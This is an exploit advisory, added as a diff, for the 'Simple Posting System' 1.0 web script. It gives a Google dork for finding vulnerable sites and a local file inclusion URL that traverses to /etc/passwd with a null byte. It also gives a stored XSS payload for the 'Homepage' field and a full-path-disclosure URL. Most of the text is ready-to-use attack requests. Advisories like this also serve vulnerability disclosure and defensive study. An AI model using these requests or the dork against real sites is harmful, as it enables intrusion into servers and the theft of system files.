@@ -1,0 +1,25 @@
+# Exploit Title: Simple Posting System [Multple]
+# Google Dork: inurl:sps.php?old= or inurl:sps.php "
+# Date: 14/03/2012
+# Author: n0tch aka andmuchmore
+# Software Link: http://realize.be/files/sps.tar.gz
+# Version: 1.0 Final
+# Tested on:  Windows 7 / Linux(Ubuntu)
+
+
++[-- LFI --]+
+
+http://localhost/sps.php?old=../../../../../../../../../../../../../../../../../etc/passwd%00
+
++[-- Persistent XSS --]+
+
+Vulnerable Field = "Homepage"
+Payload syntax: ><script>alert('XSS');</script>
+
++[-- FPD --]+
+
+http://localhost/sps/sps_admin/comment.php?op=del&id=3&aantal=4
+
++[-- Shoutz --]+
+
+All the belegit crew..
